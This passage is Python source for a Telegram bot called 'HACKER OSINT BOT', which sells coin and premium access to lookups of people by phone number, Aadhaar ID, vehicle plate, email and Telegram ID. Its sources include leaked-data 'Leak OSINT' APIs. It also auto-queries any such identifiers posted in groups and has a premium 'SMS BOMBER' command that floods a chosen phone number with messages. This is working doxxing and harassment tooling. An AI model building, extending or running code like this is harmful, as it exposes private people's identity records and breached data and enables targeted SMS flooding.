        elif f[0]:  d = fetch_sarkari_vehicle(q)
        else:       d = fetch_ansh_number(q)

        if not d:
            safe_send(c.message.chat.id, "❌ No data"); return
        try:
            jtext = json.dumps(d, indent=2, ensure_ascii=False)
            if len(jtext) > 3800:
                jtext = jtext[:3800] + "\n... (truncated)"
            safe_send(c.message.chat.id, f"`📊 JSON\n\n{jtext.replace('`', chr(39))}`", parse_mode='Markdown')
        except Exception:
            safe_send(c.message.chat.id, f"📊 JSON:\n{V(str(d))[:3500]}", parse_mode='Markdown')
    except Exception:
        try: bot.answer_callback_query(c.id, "❌ Error")
        except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data.startswith('pin_'))
def pin_callback(c):
    try:
        if c.from_user.id != ADMIN_ID:
            bot.answer_callback_query(c.id, "❌ Admin only", True); return
        try:
            message_id = int(c.data.split('_', 1)[1])
        except Exception:
            bot.answer_callback_query(c.id, "❌ Invalid"); return
        bot.pin_chat_message(c.message.chat.id, message_id)
        bot.answer_callback_query(c.id, "📌 Pinned!")
    except Exception:
        try: bot.answer_callback_query(c.id, "❌ Pin failed!", True)
        except Exception: pass

# ==================== PROCESS QUERY ====================
def process_query(m, q, is_vehicle=False, is_special=False, is_aadhaar=False,
                  is_number_special=False, is_aadhaar_special=False, is_tg_number=False,
                  is_pakistan=False, is_num_rezone=False, is_ansh=False, is_sarkari_num=False,
                  is_sarkari_aadhaar=False, is_leak_number=False, is_leak_email=False,
                  is_sarkari_vehicle=False, is_v2n=False):
    try:
        l = gl(m.from_user.id)
        ensure_user(m.from_user.id, m.from_user.first_name or "User", m.from_user.username or "")
        is_premium_user = ip(m.from_user.id)
        is_group = m.chat.type in ('group', 'supergroup')

        if not is_premium_user:
            coins = gc(m.from_user.id)
            if coins <= 0:
                mk = InlineKeyboardMarkup(row_width=1)
                mk.add(InlineKeyboardButton("🎁 Claim FREE Coin", callback_data="claim_coin"))
                mk.add(InlineKeyboardButton("💎 Buy Premium", callback_data="show_premium"))
                safe_reply(m, "❌ **No Coins!** Claim daily FREE coin.", reply_markup=mk, parse_mode='Markdown')
                return
            if not dc(m.from_user.id):
                safe_reply(m, L[l]['nc'], reply_markup=main_menu(l))
                return

        if   is_ansh:            stype = "NORMAL-ANSH"
        elif is_sarkari_num:     stype = "NUM-SARKARI"
        elif is_num_rezone:      stype = "NUM-REZONE"
        elif is_sarkari_aadhaar: stype = "AADHAAR-SARKARI"
        elif is_leak_number:     stype = "LEAK-NUMBER"
        elif is_leak_email:      stype = "LEAK-EMAIL"
        elif is_sarkari_vehicle: stype = "VEHICLE-SARKARI"
        elif is_v2n:             stype = "VEHICLE-NUM"
        elif is_aadhaar_special: stype = "AADHAAR-SPL"
        elif is_pakistan:        stype = "PAKISTAN"
        elif is_tg_number:       stype = "TG-NUMBER"
        elif is_aadhaar:         stype = "AADHAAR"
        elif is_number_special:  stype = "SPECIAL"
        elif is_special:         stype = "VEHICLE-SPL"
        elif is_vehicle:         stype = "VEHICLE"
        else:                    stype = "NORMAL"

        f = [int(bool(is_vehicle)), int(bool(is_special)), int(bool(is_aadhaar)),
             int(bool(is_number_special)), int(bool(is_aadhaar_special)),
             int(bool(is_tg_number)), int(bool(is_pakistan)), int(bool(is_num_rezone)),
             int(bool(is_ansh)), int(bool(is_sarkari_num)), int(bool(is_sarkari_aadhaar)),
             int(bool(is_leak_number)), int(bool(is_leak_email))]
        flags = "".join(str(x) for x in f)  # 13 chars

        data_holder = {"d": None, "done": False}

        def fetch_data():
            try:
                if   is_ansh:            data_holder["d"] = fetch_ansh_number(q)
                elif is_sarkari_num:     data_holder["d"] = fetch_sarkari_num(q)
                elif is_sarkari_aadhaar: data_holder["d"] = fetch_sarkari_aadhaar(q)
                elif is_leak_number or is_leak_email: data_holder["d"] = fetch_leak_osint(q)
                elif is_v2n:             data_holder["d"] = fetch_vehicle_to_num(q)
                elif is_sarkari_vehicle: data_holder["d"] = fetch_sarkari_vehicle(q)
                elif is_num_rezone:      data_holder["d"] = fetch_ansh_number(q)
                elif is_aadhaar_special: data_holder["d"] = fetch_aadhaar_special(q)
                elif is_pakistan:        data_holder["d"] = fetch_pakistan(q)
                elif is_tg_number:       data_holder["d"] = fetch_tg_number(q)
                elif is_aadhaar:         data_holder["d"] = fetch_sarkari_aadhaar(q)
                elif is_number_special:  data_holder["d"] = fetch_special(q)
                elif is_special:         data_holder["d"] = fetch_vehicle_special(q)
                elif is_vehicle:         data_holder["d"] = fetch_sarkari_vehicle(q)
                else:                    data_holder["d"] = fetch_ansh_number(q)
            except Exception:
                data_holder["d"] = None
            finally:
                data_holder["done"] = True

        fetch_thread = threading.Thread(target=fetch_data, daemon=True)
        fetch_thread.start()

        try:
            msg = bot.reply_to(m, "`💻 INITIALIZING...`", parse_mode='Markdown')
        except Exception:
            try: msg = bot.reply_to(m, "💻 INITIALIZING...")
            except Exception: return

        try: hacker_loading(m.chat.id, msg.message_id, q, stype)
        except Exception: pass

        fetch_thread.join(timeout=18)
        d = data_holder["d"]

        if not d:
            safe_edit(m.chat.id, msg.message_id,
                      f"`❌ ACCESS DENIED`\n\n`> {V(q)}`\n`> No data / API error`",
                      parse_mode='Markdown')
            return

        send_log(m.from_user.id, m.from_user.username, q, d, stype)
        res = format_result(
            d, q,
            is_vehicle=is_vehicle, is_special=is_special, is_aadhaar=is_aadhaar,
            is_number_special=is_number_special, is_aadhaar_special=is_aadhaar_special,
            is_tg_number=is_tg_number, is_pakistan=is_pakistan, is_num_rezone=is_num_rezone,
            is_ansh=is_ansh, is_sarkari_num=is_sarkari_num, is_sarkari_aadhaar=is_sarkari_aadhaar,
            is_leak_number=is_leak_number, is_leak_email=is_leak_email,
            is_sarkari_vehicle=is_sarkari_vehicle, is_v2n=is_v2n
        )

        header = (f"`╔══════════════════════════════╗`\n"
                  f"`║  💚 ACCESS GRANTED 💚        ║`\n"
                  f"`╚══════════════════════════════╝`\n"
                  f"`🎯 {V(q)[:60]}`\n")
        full = header + res

        ok = safe_edit(m.chat.id, msg.message_id, full, parse_mode='Markdown')
        if ok:
            markup = result_btn(q, l, flags, msg.message_id if is_group else None, is_group)
            try: bot.edit_message_reply_markup(m.chat.id, msg.message_id, reply_markup=markup)
            except Exception: pass

        if not is_premium_user and not is_group:
            coins_left = gc(m.from_user.id)
            if coins_left > 0:
                try: safe_send(m.chat.id, f"🪙 **Coins Left: {coins_left}**", parse_mode='Markdown')
                except Exception: pass
    except Exception:
        try: safe_send(m.chat.id, "❌ Error occurred. Try again.")
        except Exception: pass

# ==================== COMMANDS ====================
@bot.message_handler(commands=['start'], chat_types=['private'])
def st(m):
    try:
        au(m.from_user.id, m.from_user.first_name or "", m.from_user.username or "")
        bot.send_message(m.chat.id, L['en']['lang'], reply_markup=lang_selection(), parse_mode='Markdown')
    except Exception:
        try: bot.send_message(m.chat.id, "🌐 Select Language:", reply_markup=lang_selection())
        except Exception: pass

@bot.message_handler(commands=['myid', 'id', 'whoami'])
def myid_cmd(m):
    try:
        uid = m.from_user.id
        un = m.from_user.username or "N/A"
        fn = m.from_user.first_name or "N/A"
        ensure_user(uid, fn, un)
        safe_reply(m, f"🆔 **Your Telegram Info**\n\n👤 {M(fn)}\n📛 @{M(un)}\n🆔 **ID:** `{uid}`\n\n📌 Send to admin for Premium/Coins.",
                   parse_mode='Markdown')
    except Exception:
        try: bot.reply_to(m, f"Your ID: {m.from_user.id}")
        except Exception: pass

@bot.message_handler(commands=['boom', 'bomber', 'smsbomb'], chat_types=['private'])
def boom_cmd(m):
    try:
        uid = m.from_user.id
        ensure_user(uid, m.from_user.first_name or "User", m.from_user.username or "")
        if not ip(uid):
            mk = InlineKeyboardMarkup(row_width=1)
            mk.add(InlineKeyboardButton("💎 Buy Premium", callback_data="show_premium"))
            mk.add(InlineKeyboardButton("🎁 Claim FREE Coin", callback_data="claim_coin"))
            safe_reply(m, "🔒 **SMS BOMBER — Premium Only**", reply_markup=mk, parse_mode='Markdown')
            return
        parts = (m.text or "").split(maxsplit=2)
        if len(parts) == 1:
            with BOMBER_LOCK:
                BOMBER_STATE[uid] = {"step": "number", "number": "", "message": ""}
            safe_reply(m, "💥 **SMS BOMBER**\n\n📱 Send 10-digit number:\n\n💡 Fast: `/boom 9876543210 Message`", parse_mode='Markdown')
            return
        if len(parts) == 2:
            number = parts[1].strip()
            if not is_valid_number(number):
                safe_reply(m, "❌ Invalid number!"); return
            with BOMBER_LOCK:
                BOMBER_STATE[uid] = {"step": "message", "number": number, "message": ""}
            safe_reply(m, f"✅ Number: `{V(number)}`\n\n💬 Now send Message:", parse_mode='Markdown')
            return
        number = parts[1].strip()
        message = parts[2].strip()
        if not is_valid_number(number):
            safe_reply(m, "❌ Invalid number!"); return
        if not (1 <= len(message) <= 200):
            safe_reply(m, "❌ Message 1-200 chars!"); return
        mk = InlineKeyboardMarkup(row_width=2)
        mk.add(InlineKeyboardButton("🚀 LAUNCH", callback_data="bomber_confirm_direct"),
               InlineKeyboardButton("❌ Cancel", callback_data="bomber_cancel"))
        with BOMBER_LOCK:
            BOMBER_STATE[uid] = {"step": "confirm", "number": number, "message": message}
        safe_reply(m, f"`💥 CONFIRM`\n`📱 {V(number)}`\n`💬 {V(message)}`", reply_markup=mk, parse_mode='Markdown')
    except Exception:
        try: bot.reply_to(m, "❌ Error")
        except Exception: pass

@bot.message_handler(func=lambda m: BOMBER_STATE.get(m.from_user.id, {}).get("step") in ("number", "message"),
                     chat_types=['private'])
def bomber_input_handler(m):
    try:
        uid = m.from_user.id
        with BOMBER_LOCK:
            state = BOMBER_STATE.get(uid, {})
            step = state.get("step")
        if step not in ("number", "message"): return
        text = (m.text or "").strip()
        if step == "number":
            if not is_valid_number(text):
                safe_reply(m, "❌ Invalid number!"); return
            with BOMBER_LOCK:
                state = BOMBER_STATE.get(uid, {})
                state["number"] = text; state["step"] = "message"
                BOMBER_STATE[uid] = state
            safe_reply(m, f"✅ Number: `{V(text)}`\n\n💬 Send Message:", parse_mode='Markdown')
        elif step == "message":
            if not (1 <= len(text) <= 200):
                safe_reply(m, "❌ 1-200 chars!"); return
            with BOMBER_LOCK:
                state = BOMBER_STATE.get(uid, {})
                state["message"] = text; state["step"] = "confirm"
                BOMBER_STATE[uid] = state
            mk = InlineKeyboardMarkup(row_width=2)
            mk.add(InlineKeyboardButton("🚀 LAUNCH", callback_data="bomber_confirm"),
                   InlineKeyboardButton("❌ Cancel", callback_data="bomber_cancel"))
            safe_reply(m, f"`💥 CONFIRM`\n`📱 {V(state.get('number',''))}`\n`💬 {V(text)}`",
                       reply_markup=mk, parse_mode='Markdown')
    except Exception:
        try: bot.reply_to(m, "❌ Error")
        except Exception: pass

# ---- Main commands ----
@bot.message_handler(commands=['normal', 'verify'], chat_types=['private'])
def normal_cmd(m):
    p = (m.text or "").split()
    if len(p) < 2:
        safe_reply(m, "📱 Send number for /normal:\n`/normal 9876543210`", parse_mode='Markdown'); return
    process_query(m, p[1].strip(), is_ansh=True)

@bot.message_handler(commands=['num'], chat_types=['private'])
def nc(m):
    p = (m.text or "").split()
    if len(p) < 2:
        safe_reply(m, "📱 Send number for /num:\n`/num 9876543210`", parse_mode='Markdown'); return
    process_query(m, p[1].strip(), is_sarkari_num=True)

@bot.message_handler(commands=['aadhaar', 'aadhar'], chat_types=['private'])
def acmd(m):
    p = (m.text or "").split()
    if len(p) < 2:
        safe_reply(m, L[gl(m.from_user.id)]['enter_aadhaar']); return
    process_query(m, p[1].strip(), is_sarkari_aadhaar=True)

@bot.message_handler(commands=['leaknumber', 'leaknum'], chat_types=['private'])
def leak_number_cmd(m):
    p = (m.text or "").split()
    if len(p) < 2:
        safe_reply(m, "🔎 Send number for Leak OSINT:\n`/leaknumber 9876543210`", parse_mode='Markdown'); return
    process_query(m, p[1].strip(), is_leak_number=True)

@bot.message_handler(commands=['leakemail', 'leakmail'], chat_types=['private'])
def leak_email_cmd(m):
    p = (m.text or "").split()
    if len(p) < 2:
        safe_reply(m, "📧 Send email for Leak OSINT:\n`/leakemail user@example.com`", parse_mode='Markdown'); return
    process_query(m, p[1].strip(), is_leak_email=True)

@bot.message_handler(commands=['vehicletonum', 'v2n', 'vtonum'], chat_types=['private'])
def v2n_cmd(m):
    p = (m.text or "").split()
    if len(p) < 2:
        safe_reply(m, "🚘 Send vehicle number for Vehicle→Number:\n`/vehicletonum KL41V3504`", parse_mode='Markdown'); return
    process_query(m, p[1].strip().upper(), is_v2n=True)

@bot.message_handler(commands=['vehicle', 'v'], chat_types=['private'])
def vc(m):
    p = (m.text or "").split()
    if len(p) < 2:
        safe_reply(m, L[gl(m.from_user.id)]['enter_vehicle']); return
    process_query(m, p[1].strip().upper(), is_sarkari_vehicle=True)

@bot.message_handler(commands=['vehiclespecial', 'vs'], chat_types=['private'])
def vsc(m):
    p = (m.text or "").split()
    if len(p) < 2:
        safe_reply(m, L[gl(m.from_user.id)]['enter_vehicle_special']); return
    process_query(m, p[1].strip(), is_special=True)

@bot.message_handler(commands=['search'], chat_types=['private'])
def search_cmd(m):
    p = (m.text or "").split()
    if len(p) < 2:
        safe_reply(m, L[gl(m.from_user.id)]['enter_number']); return
    process_query(m, p[1].strip(), is_ansh=True)

@bot.message_handler(commands=['special'], chat_types=['private'])
def special_cmd(m):
    p = (m.text or "").split()
    if len(p) < 2:
        safe_reply(m, "🔍 Send number for Special:"); return
    process_query(m, p[1].strip(), is_number_special=True)

@bot.message_handler(commands=['tgnumber', 'tg'], chat_types=['private'])
def tg_number_cmd(m):
    p = (m.text or "").split()
    if len(p) < 2:
        safe_reply(m, "📞 Send Telegram ID:"); return
    process_query(m, p[1].strip(), is_tg_number=True)

@bot.message_handler(commands=['aadharspecial', 'aspecial'], chat_types=['private'])
def aadhaar_special_cmd(m):
    p = (m.text or "").split()
    if len(p) < 2:
        safe_reply(m, "🆔 Send 12-digit Aadhaar:"); return
    process_query(m, p[1].strip(), is_aadhaar_special=True)

@bot.message_handler(commands=['pakistan', 'pk'], chat_types=['private'])
def pakistan_cmd(m):
    p = (m.text or "").split()
    if len(p) < 2:
        safe_reply(m, "🇵🇰 Send Pakistan number:"); return
    process_query(m, p[1].strip(), is_pakistan=True)

# ==================== AUTO-DETECT ====================
@bot.message_handler(func=lambda m: bool(re.match(r'^0\d{10}$', m.text or '')) and
                     BOMBER_STATE.get(m.from_user.id, {}).get("step") not in ("number", "message") and
                     not (m.text or '').startswith('/'),
                     chat_types=['private', 'group', 'supergroup'])
def pkn(m): process_query(m, m.text.strip(), is_pakistan=True)

@bot.message_handler(func=lambda m: bool(re.match(r'^\d{10}$', m.text or '')) and
                     BOMBER_STATE.get(m.from_user.id, {}).get("step") not in ("number", "message") and
                     not (m.text or '').startswith('/'),
                     chat_types=['private', 'group', 'supergroup'])
def hn(m): process_query(m, m.text.strip(), is_ansh=True)

@bot.message_handler(func=lambda m: bool(re.match(r'^[A-Z]{2}\d{2}[A-Z]{0,2}\d{4}$', (m.text or '').upper())) and
                     not (m.text or '').startswith('/'),
                     chat_types=['private', 'group', 'supergroup'])
def vhn(m): process_query(m, m.text.strip().upper(), is_sarkari_vehicle=True)

@bot.message_handler(func=lambda m: bool(re.match(r'^\d{12}$', m.text or '')) and
                     not (m.text or '').startswith('/'),
                     chat_types=['private', 'group', 'supergroup'])
def ahn(m): process_query(m, m.text.strip(), is_sarkari_aadhaar=True)

@bot.message_handler(func=lambda m: bool(re.match(r'^[\w\.\-\+]+@[\w\.\-]+\.\w+$', m.text or '')) and
                     not (m.text or '').startswith('/') and
                     BOMBER_STATE.get(m.from_user.id, {}).get("step") not in ("number", "message"),
                     chat_types=['private', 'group', 'supergroup'])
def email_auto(m): process_query(m, m.text.strip(), is_leak_email=True)

# ==================== GROUP COMMANDS ====================
def _group_cmd(m, flag_fn, usage):
    p = (m.text or "").split()
    if len(p) < 2:
        safe_reply(m, f"❌ {usage}"); return
    process_query(m, p[1].strip(), **flag_fn())

@bot.message_handler(commands=['num'], chat_types=['group', 'supergroup'])
def gn(m): _group_cmd(m, lambda: {'is_sarkari_num': True}, "/num 9876543210")

@bot.message_handler(commands=['normal'], chat_types=['group', 'supergroup'])
def gnormal(m): _group_cmd(m, lambda: {'is_ansh': True}, "/normal 9876543210")

@bot.message_handler(commands=['special'], chat_types=['group', 'supergroup'])
def gspecial(m): _group_cmd(m, lambda: {'is_number_special': True}, "/special 9876543210")

@bot.message_handler(commands=['vehicle'], chat_types=['group', 'supergroup'])
def gv(m):
    p = (m.text or "").split()
    if len(p) < 2: safe_reply(m, "❌ /vehicle RJ14CV0002"); return
    process_query(m, p[1].strip().upper(), is_sarkari_vehicle=True)

@bot.message_handler(commands=['vehiclespecial'], chat_types=['group', 'supergroup'])
def gvs(m):
    p = (m.text or "").split()
    if len(p) < 2: safe_reply(m, "❌ /vehiclespecial RJ14CV0002"); return
    process_query(m, p[1].strip().upper(), is_special=True)

@bot.message_handler(commands=['aadhaar'], chat_types=['group', 'supergroup'])
def gaadhaar(m): _group_cmd(m, lambda: {'is_sarkari_aadhaar': True}, "/aadhaar 962397300673")

@bot.message_handler(commands=['aadharspecial'], chat_types=['group', 'supergroup'])
def gaadharspl(m): _group_cmd(m, lambda: {'is_aadhaar_special': True}, "/aadharspecial 254944943909")

@bot.message_handler(commands=['tgnumber'], chat_types=['group', 'supergroup'])
def gtgnum(m): _group_cmd(m, lambda: {'is_tg_number': True}, "/tgnumber 6936978343")

@bot.message_handler(commands=['pakistan'], chat_types=['group', 'supergroup'])
def gpak(m): _group_cmd(m, lambda: {'is_pakistan': True}, "/pakistan 03359736848")

@bot.message_handler(commands=['leaknumber'], chat_types=['group', 'supergroup'])
def gleaknum(m): _group_cmd(m, lambda: {'is_leak_number': True}, "/leaknumber 9876543210")

@bot.message_handler(commands=['leakemail'], chat_types=['group', 'supergroup'])
def gleakemail(m): _group_cmd(m, lambda: {'is_leak_email': True}, "/leakemail user@example.com")

@bot.message_handler(commands=['vehicletonum'], chat_types=['group', 'supergroup'])
def gv2n(m):
    p = (m.text or "").split()
    if len(p) < 2: safe_reply(m, "❌ /vehicletonum KL41V3504"); return
    process_query(m, p[1].strip().upper(), is_v2n=True)

@bot.message_handler(commands=['start', 'help'], chat_types=['group', 'supergroup'])
def gs(m):
    l = gl(m.from_user.id)
    safe_reply(m, "👋 /num /normal /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /leaknumber /leakemail /vehicletonum /boom\n💎 1D ₹10, 1W ₹60, 1M ₹101\n\n⚡ Or just send a 10-digit number / vehicle / aadhaar directly!",
               reply_markup=group_menu(l))

# ==================== GENERAL ====================
@bot.message_handler(commands=['menu'])
def me(m):
    try:
        l = gl(m.from_user.id)
        if m.chat.type in ('group', 'supergroup'):
            safe_send(m.chat.id, "📱 Menu", reply_markup=group_menu(l)); return
        coins = gc(m.from_user.id)
        status = "💎 **Premium**" if ip(m.from_user.id) else f"🪙 **Coins:** {coins}"
        safe_send(m.chat.id, f"{L[l]['main_menu']}\n\n{status}", reply_markup=main_menu(l), parse_mode='Markdown')
    except Exception:
        try: bot.send_message(m.chat.id, "📱 Menu", reply_markup=main_menu('en'))
        except Exception: pass

@bot.message_handler(commands=['claim'])
def cl2(m):
    try:
        l = gl(m.from_user.id)
        if claim_daily_coin(m.from_user.id):
            coins = gc(m.from_user.id)
            safe_reply(m, L[l]['coin_claimed'].format(coins=coins), parse_mode='Markdown')
        else:
            safe_reply(m, L[l]['already_claimed'])
    except Exception:
        try: bot.reply_to(m, "❌ Error")
        except Exception: pass

@bot.message_handler(commands=['premium'])
def pm(m):
    try:
        l = gl(m.from_user.id)
        if ip(m.from_user.id):
            safe_reply(m, "🎉 Already premium!"); return
        sent = False
        try:
            with open(QR_PATH, 'rb') as qr:
                bot.send_photo(m.chat.id, qr, caption=L[l]['welcome'],
                               reply_markup=premium_plans_kb(l), parse_mode='Markdown')
                sent = True
        except Exception: pass
        if not sent:
            safe_send(m.chat.id, L[l]['welcome'], reply_markup=premium_plans_kb(l), parse_mode='Markdown')
    except Exception:
        try: bot.reply_to(m, "❌ Error")
        except Exception: pass

@bot.message_handler(commands=['profile'])
def pr2(m):
    try:
        uid = m.from_user.id
        ensure_user(uid, m.from_user.first_name or "User", m.from_user.username or "")
        coins = gc(uid)
        prem = "✅ Active" if ip(uid) else "❌ Inactive"
        searches = 0
        try:
            with _db_lock:
                cur = conn.cursor()
                cur.execute("SELECT searches FROM users WHERE user_id=?", (uid,))
                r = cur.fetchone(); searches = r[0] if r else 0
        except Exception: pass
        l = gl(uid)
        safe_reply(m, L[l]['profile'].format(uid=uid, coins=coins, prem=prem, searches=searches), parse_mode='Markdown')
    except Exception:
        try: bot.reply_to(m, "❌ Error")
        except Exception: pass

@bot.message_handler(commands=['contact'])
def ct(m):
    try: safe_reply(m, f"📞 {OWNER}\n🌐 {WEBSITE}")
    except Exception: pass

@bot.message_handler(commands=['clear'])
def clear_cmd(m):
    try:
        bot.delete_message(m.chat.id, m.message_id)
        safe_reply(m, "🗑️")
    except Exception:
        try: bot.reply_to(m, "❌")
        except Exception: pass

@bot.message_handler(commands=['help'], chat_types=['private'])
def hp(m):
    try: safe_reply(m, L[gl(m.from_user.id)]['help'], parse_mode='Markdown')
    except Exception: pass

@bot.message_handler(commands=['language', 'lang'])
def lg(m):
    try:
        bot.send_message(m.chat.id, L['en']['lang'], reply_markup=lang_selection(), parse_mode='Markdown')
    except Exception: pass

@bot.message_handler(commands=['website', 'site'])
def wsite(m):
    try:
        safe_reply(m, f"🌐 **Website**\n👉 {WEBSITE}",
                   reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🌐 Visit", url=WEBSITE)),
                   parse_mode='Markdown')
    except Exception: pass

@bot.message_handler(commands=['pin'])
def pin_command(m):
    try:
        if m.from_user.id != ADMIN_ID:
            safe_reply(m, "⚠️ Not authorized."); return
        if m.reply_to_message:
            try:
                bot.pin_chat_message(m.chat.id, m.reply_to_message.message_id)
                safe_reply(m, "📌 Pinned!")
            except Exception:
                safe_reply(m, "❌ Pin failed.")
        else:
            safe_reply(m, "❌ Reply with /pin")
    except Exception: pass

# ==================== ADMIN ====================
@bot.message_handler(commands=['addpremium'])
def ap2(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        _, uid, days = m.text.split()
        uid_int = int(uid); days_int = int(days)
        if ap(uid_int, days_int):
            safe_reply(m, f"✅ Premium → `{uid_int}` ({days_int}d)", parse_mode='Markdown')
            try: bot.send_message(uid_int, f"🎉 **Premium Activated!**\n⏰ {days_int} days", parse_mode='Markdown')
            except Exception: pass
    except Exception:
        safe_reply(m, "❌ /addpremium [uid] [days]")

@bot.message_handler(commands=['removepremium'])
def rp(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        _, uid = m.text.split()
        uid_int = int(uid)
        with _db_lock:
            c.execute("UPDATE users SET premium=0, premium_expiry=NULL WHERE user_id=?", (uid_int,)); conn.commit()
        with _prem_lock:
            _prem_cache.pop(uid_int, None)
        safe_reply(m, f"✅ Removed from `{uid_int}`", parse_mode='Markdown')
    except Exception:
        safe_reply(m, "❌ /removepremium [uid]")

@bot.message_handler(commands=['addcoins'])
def ac(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        _, uid, coins = m.text.split()
        uid_int = int(uid); coins_int = int(coins)
        new_coins = add_coins_db(uid_int, coins_int)
        safe_reply(m, f"✅ Coins → `{uid_int}`\n🪙 Total: **{new_coins}**", parse_mode='Markdown')
        try: bot.send_message(uid_int, f"🪙 **+{coins_int} Coins!** Total: {new_coins}", parse_mode='Markdown')
        except Exception: pass
    except Exception:
        safe_reply(m, "❌ /addcoins [uid] [coins]")

@bot.message_handler(commands=['userinfo'])
def userinfo_cmd(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        _, uid = m.text.split()
        uid_int = int(uid)
        with _db_lock:
            cur = conn.cursor()
            cur.execute("SELECT user_id, first_name, username, coins, premium, premium_expiry, searches FROM users WHERE user_id=?", (uid_int,))
            r = cur.fetchone()
        if not r: safe_reply(m, "❌ User not in DB."); return
        safe_reply(m,
            f"👤 ID: `{r[0]}`\n👤 {M(r[1] or 'N/A')}\n@ {M(r[2] or 'N/A')}\n"
            f"🪙 {r[3]}\n💎 {'✅' if ip(uid_int) else '❌'}\n🔍 {r[6]}",
            parse_mode='Markdown')
    except Exception:
        safe_reply(m, "❌ /userinfo [uid]")

@bot.message_handler(commands=['users'])
def us(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        with _db_lock:
            c.execute("SELECT user_id, username, coins, premium FROM users ORDER BY user_id DESC LIMIT 20")
            users = c.fetchall()
        if not users:
            safe_reply(m, "No users."); return
        text = "📋 **Users:**\n"
        for u in users:
            text += f"🆔 `{u[0]}` @{M(u[1] or 'N/A')} 🪙{u[2]} {'💎' if u[3] else ''}\n"
        safe_reply(m, text, parse_mode='Markdown')
    except Exception: pass

@bot.message_handler(commands=['stats'])
def st2(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        with _db_lock:
            c.execute("SELECT COUNT(*) FROM users"); total = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM users WHERE access=1"); access = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM users WHERE premium=1"); premium = c.fetchone()[0]
            c.execute("SELECT SUM(coins) FROM users"); coins = c.fetchone()[0] or 0
        searches = get_total_searches()
        safe_reply(m, L[gl(m.from_user.id)]['stats_text'].format(
            total=total, access=access, premium=premium, coins=coins, searches=searches), parse_mode='Markdown')
    except Exception: pass

@bot.message_handler(commands=['broadcast'])
def broadcast(m):
    if m.from_user.id != ADMIN_ID: return
    msg = (m.text or "").replace('/broadcast', '', 1).strip()
    if not msg:
        safe_reply(m, "❌ /broadcast [message]"); return
    def send_bc():
        try:
            with _db_lock:
                c.execute("SELECT user_id FROM users"); users = c.fetchall()
            sent = 0
            for uid in users:
                try:
                    bot.send_message(uid[0], "📢 Announcement\n\n" + msg)
                    sent += 1
                    time.sleep(0.05)
                except Exception: pass
            try: bot.send_message(ADMIN_ID, f"✅ Broadcast sent to {sent} users!")
            except Exception: pass
        except Exception:
            try: bot.send_message(ADMIN_ID, "❌ Broadcast error")
            except Exception: pass
    threading.Thread(target=send_bc, daemon=True).start()
    safe_reply(m, "📢 Broadcasting in background...")

@bot.message_handler(commands=['testapi'])
def test_api(m):
    if m.from_user.id != ADMIN_ID: return
    parts = (m.text or "").split()
    if len(parts) < 3:
        safe_reply(m, "❌ /testapi [type] [value]\nTypes: normal, num, aadhaar, leaknum, leakemail, vehicle, v2n, special, tg, aadharspl, pk")
        return
    typ = parts[1].lower(); val = parts[2].strip()
    handlers = {
        "normal":    fetch_ansh_number,
        "num":       fetch_sarkari_num,
        "aadhaar":   fetch_sarkari_aadhaar,
        "leaknum":   fetch_leak_osint,
        "leakemail": fetch_leak_osint,
        "vehicle":   fetch_sarkari_vehicle,
        "v2n":       fetch_vehicle_to_num,
        "special":   fetch_special,
        "tg":        fetch_tg_number,
        "aadharspl": fetch_aadhaar_special,
        "pk":        fetch_pakistan,
    }
    fn = handlers.get(typ)
    if not fn:
        safe_reply(m, "❌ Invalid type"); return
    data = fn(val)
    if data:
        try:
            jtext = json.dumps(data, indent=2, ensure_ascii=False)[:3500]
            safe_reply(m, f"```json\n{jtext}\n```", parse_mode='Markdown')
        except Exception:
            safe_reply(m, "✅ Data received but too complex")
    else:
        safe_reply(m, "❌ No data")

# ==================== MAIN ====================
if __name__ == "__main__":
    print("=" * 60)
    print("🔥 HACKER OSINT BOT v3.1 — BUG-FREE PRODUCTION BUILD")
    print("=" * 60)
    print(f"👨‍💻 Owner: {OWNER}")
    print(f"🌐 Website: {WEBSITE}")
    print("-" * 60)
    print("✅ /normal     → Ansh API")
    print("✅ /num        → Sarkariupdate Number")
    print("✅ /aadhaar    → Sarkariupdate Aadhaar")
    print("✅ /leaknumber → Leak OSINT (Number)")
    print("✅ /leakemail  → Leak OSINT (Email)")
    print("✅ /vehicle    → Sarkariupdate Vehicle")
    print("✅ /vehicletonum → Vehicle→Number")
    print("-" * 60)
    print("🛡️  Markdown-safe output (no parse crashes)")
    print("🛡️  Callback query cache (no 64-byte overflow)")
    print("🛡️  Thread-safe DB + caches (no race conditions)")
    print("🛡️  Case-insensitive API parsing")
    print("🛡️  Auto-truncate long messages")
    print("🛡️  Auto-fallback if parse_mode fails")
    print("=" * 60)
    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=30)
        except Exception as e:
            print(f"⚠️  Polling crashed: {e}")
            time.sleep(5)